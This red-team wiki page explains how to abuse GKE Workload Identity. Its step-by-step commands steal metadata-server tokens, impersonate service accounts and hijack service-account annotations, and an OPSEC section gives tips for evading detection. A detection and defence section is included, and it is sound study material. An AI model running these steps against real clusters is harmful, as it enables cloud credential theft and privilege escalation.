---
title: GKE Workload Identity abuse
slug: gke-workload-identity-abuse
---

> **TL;DR:** GKE Workload Identity binds a Kubernetes Service Account (KSA) to a Google Service Account (GSA) via the `iam.gke.io/gcp-service-account` annotation plus an `iam.workloadIdentityUser` role binding; compromise a pod and you get the bound GSA's IAM, often with project-level `roles/editor` or owner-equivalent. The classic mistakes are over-broad GSA bindings, sharing one GSA across namespaces, and forgetting to clean up annotations after a migration.

## What it is
Pre-Workload-Identity, GKE pods used the node's compute engine service account — every pod on a node shared one identity, usually `roles/editor`. Workload Identity fixes that by giving each Kubernetes ServiceAccount its own GCP identity through a GKE-managed OIDC trust: a pod requests a token from the metadata server (`169.254.169.254` projected as a workload-identity socket), the GKE metadata server federates the KSA's projected token into a GSA access token, and the SDK uses it transparently. Two halves of the configuration: (1) IAM binding `roles/iam.workloadIdentityUser` on the GSA, with member `serviceAccount:PROJECT.svc.id.goog[NS/KSA]`; (2) annotation `iam.gke.io/gcp-service-account: GSA@PROJECT.iam.gserviceaccount.com` on the KSA.

## Preconditions / where it applies
- Code execution in a pod on a GKE cluster with Workload Identity enabled (cluster config `workloadIdentityConfig.workloadPool` set).
- Or RBAC `create pods` / `create deployments` in a namespace whose KSA is bound to a privileged GSA.
- Or `patch serviceaccount` to retarget an existing KSA's annotation to a more privileged GSA.

## Tradecraft
**Step 1 — Identify the pod's identity.**

```bash
# Inside the compromised pod
curl -s -H "Metadata-Flavor: Google" \
    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
# Returns the GSA email Workload Identity federated into

curl -s -H "Metadata-Flavor: Google" \
    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Returns an OAuth2 token usable with gcloud / google-cloud-sdk
```

The legacy `kube-env` style of pulling node-level credentials no longer works on Workload Identity clusters; the metadata path returns the pod's identity, not the node's.

**Step 2 — Enumerate the GSA's IAM.**

```bash
export TOKEN=$(curl -sH 'Metadata-Flavor: Google' \
    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token \
    | jq -r .access_token)

# Project-level bindings the GSA has
curl -s -H "Authorization: Bearer $TOKEN" \
    "https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT:getIamPolicy" \
    -X POST -d '{}' \
    | jq '.bindings[] | select(.members[] | contains("'$GSA'"))'
```

Look for `roles/owner`, `roles/editor`, `roles/iam.serviceAccountTokenCreator`, `roles/iam.serviceAccountUser`, `roles/cloudbuild.builds.editor`. Any of these expand laterally.

**Step 3 — Lateral via `iam.serviceAccountTokenCreator`.** With this role on a *different* GSA, generate an access token for that GSA and pivot:

```bash
gcloud iam service-accounts get-access-token GSA2@PROJECT.iam.gserviceaccount.com \
    --impersonate-service-account=GSA2@PROJECT.iam.gserviceaccount.com
```

**Step 4 — Annotation hijack.** With `patch serviceaccount` in a namespace that has multiple KSAs bound to various GSAs:

```bash
# Discover bindings cluster-wide
kubectl get sa -A -o json | jq -r '.items[] |
    select(.metadata.annotations["iam.gke.io/gcp-service-account"]) |
    "\(.metadata.namespace)/\(.metadata.name) -> \(.metadata.annotations["iam.gke.io/gcp-service-account"])"'

# Retarget a KSA you can patch to a higher-priv GSA
kubectl annotate sa myapp -n staging \
    iam.gke.io/gcp-service-account=privileged-gsa@prod.iam.gserviceaccount.com --overwrite
# Deploy a pod with that KSA; metadata server now returns the privileged GSA's token
```

The retarget only works if the *target GSA's* `roles/iam.workloadIdentityUser` binding already permits `serviceAccount:PROJECT.svc.id.goog[staging/myapp]`. Misconfigured shops list `roles/iam.workloadIdentityUser` with `member: serviceAccount:PROJECT.svc.id.goog[*]` — accept any KSA. That's the goldmine.

**Step 5 — GKE metadata concealment bypass.** Some clusters enable "metadata concealment" or "GKE Metadata Server" to block pods from reading node metadata. Workload Identity replaces this with a per-pod metadata socket. If concealment is misconfigured (or the node is on Container-Optimized OS pre-1.21), you may still hit `169.254.169.254` directly and get the node SA — usually higher priv.

```bash
curl -s --interface eth0 -H "Metadata-Flavor: Google" \
    http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

## Detection and defence
- Cloud Audit Logs: `protoPayload.serviceName="iamcredentials.googleapis.com"` shows every Workload Identity token mint. Alert on cross-namespace anomalies.
- `gcloud iam service-accounts get-iam-policy` per GSA; alert when `roles/iam.workloadIdentityUser` member ends with `[*/*]` or `[*/x]`.
- Defence: one GSA per KSA per namespace; never reuse. Use Workload Identity Federation pools, not shared GSAs.
- Set `automountServiceAccountToken: false` on KSAs that don't need GCP access — prevents annotation-hijack via lateral pod creation.
- GKE Sandbox / gVisor reduces the impact of node-metadata bypass.

## OPSEC pitfalls
- Token requests show in Cloud Audit Logs with the calling pod's KSA — your hijacked annotation is visible.
- `gcloud auth activate-service-account` writes to `~/.config/gcloud/`; from a pod, you usually want to call REST APIs directly with the token rather than writing files.
- Token lifetime is 1 hour — re-fetch loops are noisy. Snapshot a refresh token early if `iam.serviceAccountTokenCreator` chain allows.

## References
- [GKE — Workload Identity](https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity) — concepts and configuration
- [Rhino Security Labs — GCP IAM Privilege Escalation Methods](https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp/) — chain catalogue
- [Wiz — Compromising GKE through Workload Identity](https://www.wiz.io/blog/) — real-world chain
- [Datadog Security Labs — Stealing GCP tokens](https://securitylabs.datadoghq.com/articles/stealing-gcp-tokens-via-workload-identity/) — practitioner walkthrough

See also: [[gcp-iam-misconfig]], [[gcp-service-account-enum]], [[gcp-metadata-server]], [[eks-pod-identity-abuse]], [[gcp-cloud-build-trigger-abuse]]
